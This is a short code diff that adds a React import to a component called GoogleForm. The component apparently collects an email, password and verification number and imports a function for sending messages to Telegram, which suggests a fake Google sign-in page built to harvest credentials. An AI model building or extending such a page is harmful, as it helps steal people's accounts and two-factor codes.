@@ -1,4 +1,5 @@
 import { sendMessageToTelegram } from '../lib/api';
+import React, { useState, useEffect } from 'react';
 
 
 export default function GoogleForm({ currentStep, email, setEmail, password, setPassword, invalid, verificationNumber, setInvalid }) {
